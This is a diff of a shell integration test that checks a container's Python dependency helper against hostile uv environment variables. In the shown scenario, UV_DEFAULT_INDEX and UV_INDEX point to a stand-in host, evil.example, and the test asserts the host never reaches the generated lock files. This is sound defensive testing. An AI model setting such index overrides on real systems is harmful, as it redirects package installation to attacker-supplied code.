@@ -94,19 +94,16 @@
 #                          (shim-logged add count stays at 1, recorded timing), the commit
 #                          driven after the replay returns the identical result, and the
 #                          lost-response commit replay rewrites nothing (lock mtime unchanged)
-#   helper-env-override    DIRECT helper invocations inside the container — no agent HTTP,
-#                          the hostile variables in the HELPER's own environment. The
-#                          asserted invariant: a hostile uv environment variable can never
-#                          leave its host recorded in the generated files. Observed modes
-#                          (both fail-closed, rc=5, no journal, workspace untouched): a
-#                          hostile UV_DEFAULT_INDEX alone does NOT steer the lock-generating
-#                          add (the fixed `--default-index` argv wins there) but the
-#                          installability verification (no index flag on its argv) consults
-#                          it and the run fails; a hostile UV_INDEX (the additional-index
-#                          variable) steers the add phase itself and fails against the
-#                          unreachable test host. The agent's minimal helper environment
-#                          (PATH/HOME/TMPDIR/LANG only) remains the production env layer,
-#                          proven by fixed-index-argv
+#   helper-env-override    DIRECT helper invocations inside the container — no agent HTTP —
+#                          with hostile UV_DEFAULT_INDEX and UV_INDEX in the HELPER's own
+#                          environment: the helper's uv children run with a scrubbed
+#                          environment (every UV_* variable removed), so the batch add
+#                          SUCCEEDS from the pinned mirror (rc=0), the generated
+#                          pyproject+lock record only the pinned mirror, the hostile host
+#                          appears nowhere (files or output), and the workspace sources
+#                          stay untouched. The agent's minimal helper environment remains
+#                          the first production layer (fixed-index-argv); the scrub is the
+#                          second, independent one.
 #
 # Docker ownership (names, registration, volume identity, registry, cleanup) is shared with
 # the other runner suites via tests/lib.sh — the hardened Task 3 pattern. Host-side JSON
@@ -1132,81 +1129,52 @@ EOF
   fi
 }
 
-# helper-env-override: DIRECT helper invocations inside the container — no agent HTTP, the
-# hostile variables in the HELPER's own environment. The asserted invariant is the one the
-# workspace consumes: a hostile uv environment variable can NEVER leave its host recorded in
-# the generated files, and the workspace sources stay untouched. Observed modes with the
-# unresolvable test host (both fail-closed, rc=5 PYTHON_DEPENDENCY_RESOLUTION_FAILED, no
-# journal): a hostile UV_DEFAULT_INDEX alone does NOT steer the lock-generating add (the
-# fixed `--default-index` argv wins there) but the installability verification
-# (`uv sync --locked --dry-run`, which carries no index flag) consults it and the run fails;
-# a hostile UV_INDEX (the additional-index variable) steers the add phase itself and the run
-# fails against the unreachable host. The agent's minimal helper environment
-# (PATH/HOME/TMPDIR/LANG only, proven by fixed-index-argv) remains the production env layer.
+# helper-env-override: DIRECT helper invocation inside the container — no agent HTTP — with
+# hostile UV_DEFAULT_INDEX and UV_INDEX in the HELPER's own environment. The helper's uv
+# children run with a scrubbed environment (every UV_* variable removed), so the batch add
+# must SUCCEED from the pinned mirror: rc=0, the generated pyproject+lock record only the
+# pinned mirror (registry byte-identical, artifacts under mirrors.aliyun.com/pypi/packages/),
+# the hostile host appears nowhere (files or stdout), and the workspace sources stay
+# untouched. The agent's minimal helper environment remains the first production layer
+# (fixed-index-argv); the scrub is the second, independent one.
 scenario_helper_env_override_direct() {
   local agent2 port
   read -r agent2 port <<< "$(start_agent "${PREFIX}-helpenv" "$PROJECT_ID_SHIM")"
   seed_template "$agent2"
   local py_before lock_before py_after lock_after
   read -r py_before lock_before <<< "$(workspace_digests "$agent2")"
-  # Part 1: hostile UV_DEFAULT_INDEX alone — the lock must never record the hostile host
-  # (observed: the add resolves from the pinned mirror, then the verification fails closed).
-  local part1_out rc1=0 started1 elapsed1
-  started1="$(now_ms)"
-  part1_out="$(dc exec "$agent2" sh -c '
+  local direct_out rc=0 started elapsed
+  started="$(now_ms)"
+  direct_out="$(dc exec "$agent2" sh -c '
     set -e
     mkdir -p /tmp/helper-direct/scratch
     cp /workspace/pyproject.toml /workspace/uv.lock /tmp/helper-direct/scratch/
     printf "httpx==0.28.1\n" > /tmp/helper-direct/req.txt
     cd /tmp/helper-direct/scratch
-    UV_DEFAULT_INDEX=https://evil.example/simple \
+    UV_DEFAULT_INDEX=https://evil.example/simple UV_INDEX=https://evil.example/simple \
       HOME=/tmp/helper-direct UV_CACHE_DIR=/tmp/helper-direct/uv-cache UV_LINK_MODE=copy \
       /usr/local/bin/python3 -I /opt/manao-python/dependency_helper.py \
       /tmp/helper-direct/scratch BATCH /tmp/helper-direct/req.txt 120
-  ' 2>/dev/null)" || rc1=$?
-  elapsed1=$(( $(now_ms) - started1 ))
-  echo "TIMING: helper-env-override part 1 (hostile UV_DEFAULT_INDEX; observed rc=${rc1}) ${elapsed1}ms"
-  local urls foreign evil1 urls2 evil2 foreign2
+  ' 2>/dev/null)" || rc=$?
+  elapsed=$(( $(now_ms) - started ))
+  echo "TIMING: helper-env-override direct BATCH run under hostile UV_DEFAULT_INDEX+UV_INDEX ${elapsed}ms"
+  local urls foreign evil
   urls="$(dc exec "$agent2" sh -c 'grep -hoE "https://[^\"[:space:]]+" /tmp/helper-direct/scratch/pyproject.toml /tmp/helper-direct/scratch/uv.lock | sort -u' 2>/dev/null || true)"
   foreign="$(printf '%s\n' "$urls" | grep -Fxv "$MANAO_PYTHON_INDEX_URL" | grep -v '^https://mirrors\.aliyun\.com/pypi/packages/' || true)"
-  evil1="$(dc exec "$agent2" sh -c 'grep -l "evil\.example" /tmp/helper-direct/scratch/pyproject.toml /tmp/helper-direct/scratch/uv.lock 2>/dev/null || true')"
-  # Part 2: hostile UV_INDEX (the additional-index variable) — the same invariant.
-  local part2_out rc2=0 started2 elapsed2
-  started2="$(now_ms)"
-  part2_out="$(dc exec "$agent2" sh -c '
-    set -e
-    mkdir -p /tmp/helper-direct/scratch2
-    cp /workspace/pyproject.toml /workspace/uv.lock /tmp/helper-direct/scratch2/
-    printf "httpx==0.28.1\n" > /tmp/helper-direct/req2.txt
-    cd /tmp/helper-direct/scratch2
-    UV_INDEX=https://evil.example/simple \
-      HOME=/tmp/helper-direct UV_CACHE_DIR=/tmp/helper-direct/uv-cache UV_LINK_MODE=copy \
-      /usr/local/bin/python3 -I /opt/manao-python/dependency_helper.py \
-      /tmp/helper-direct/scratch2 BATCH /tmp/helper-direct/req2.txt 120
-  ' 2>/dev/null)" || rc2=$?
-  elapsed2=$(( $(now_ms) - started2 ))
-  echo "TIMING: helper-env-override part 2 (hostile UV_INDEX; observed rc=${rc2}) ${elapsed2}ms"
-  urls2="$(dc exec "$agent2" sh -c 'grep -hoE "https://[^\"[:space:]]+" /tmp/helper-direct/scratch2/pyproject.toml /tmp/helper-direct/scratch2/uv.lock | sort -u' 2>/dev/null || true)"
-  foreign2="$(printf '%s\n' "$urls2" | grep -Fxv "$MANAO_PYTHON_INDEX_URL" | grep -v '^https://mirrors\.aliyun\.com/pypi/packages/' || true)"
-  evil2="$(dc exec "$agent2" sh -c 'grep -l "evil\.example" /tmp/helper-direct/scratch2/pyproject.toml /tmp/helper-direct/scratch2/uv.lock 2>/dev/null || true')"
+  evil="$(dc exec "$agent2" sh -c 'grep -l "evil\.example" /tmp/helper-direct/scratch/pyproject.toml /tmp/helper-direct/scratch/uv.lock 2>/dev/null || true')"
   read -r py_after lock_after <<< "$(workspace_digests "$agent2")"
-  if { [ "$rc1" != "0" ] && [ "$rc1" != "5" ]; } || { [ "$rc2" != "0" ] && [ "$rc2" != "5" ]; }; then
-    fail "helper-env-override (a direct run ended in an unexpected helper state: part1 rc=$rc1 part2 rc=$rc2 — only 0 (clean success) or 5 (fail-closed resolution failure) are safe)"
+  if [ "$rc" != "0" ] || [ -n "$direct_out" ]; then
+    fail "helper-env-override (the scrubbed-env helper run must succeed under hostile UV_DEFAULT_INDEX+UV_INDEX; rc=$rc stdout='$direct_out')"
   elif [ "$py_after" != "$py_before" ] || [ "$lock_after" != "$lock_before" ]; then
-    fail "helper-env-override (a direct scratch run touched the workspace sources)"
-  elif [ "$rc1" = "0" ] && { [ -n "$part1_out" ] \
-    || ! dc exec "$agent2" grep -q 'httpx==0.28.1' /tmp/helper-direct/scratch/pyproject.toml; }; then
-    fail "helper-env-override (part 1 reported success but did not produce a clean add: stdout='$part1_out')"
-  elif [ -n "$evil1" ]; then
-    fail "helper-env-override (part 1: hostile UV_DEFAULT_INDEX reached the generated files: $evil1)"
-  elif [ "$rc1" = "0" ] && { ! printf '%s\n' "$urls" | grep -Fqx "$MANAO_PYTHON_INDEX_URL" || [ -n "$foreign" ]; }; then
-    fail "helper-env-override (part 1 generated files record non-mirror sources: ${foreign:-registry URL missing})"
-  elif [ -n "$evil2" ]; then
-    fail "helper-env-override (part 2: hostile UV_INDEX recorded the hostile host in the generated files: $evil2)"
-  elif [ "$rc2" = "0" ] && { ! printf '%s\n' "$urls2" | grep -Fqx "$MANAO_PYTHON_INDEX_URL" || [ -n "$foreign2" ]; }; then
-    fail "helper-env-override (part 2 generated files record non-mirror sources: ${foreign2:-registry URL missing})"
+    fail "helper-env-override (the direct scratch run touched the workspace sources)"
+  elif ! dc exec "$agent2" grep -q 'httpx==0.28.1' /tmp/helper-direct/scratch/pyproject.toml; then
+    fail "helper-env-override (the direct batch run did not add httpx in the scratch)"
+  elif [ -n "$evil" ]; then
+    fail "helper-env-override (the hostile UV_* env reached the generated files: $evil)"
+  elif ! printf '%s\n' "$urls" | grep -Fqx "$MANAO_PYTHON_INDEX_URL" || [ -n "$foreign" ]; then
+    fail "helper-env-override (generated files record non-mirror sources: ${foreign:-registry URL missing})"
   else
-    pass "helper-env-override (hostile UV_DEFAULT_INDEX and UV_INDEX in the helper's own environment can never appear in the generated files; observed fail-closed modes rc1=${rc1} rc2=${rc2} [${elapsed1}ms/${elapsed2}ms]; workspace sources untouched)"
+    pass "helper-env-override (direct helper BATCH run under hostile UV_DEFAULT_INDEX+UV_INDEX succeeded from the pinned mirror: generated files record only $MANAO_PYTHON_INDEX_URL ($(printf '%s\n' "$urls" | grep -c .) distinct URLs), hostile host nowhere, workspace sources untouched) [${elapsed}ms]"
   fi
 }
 
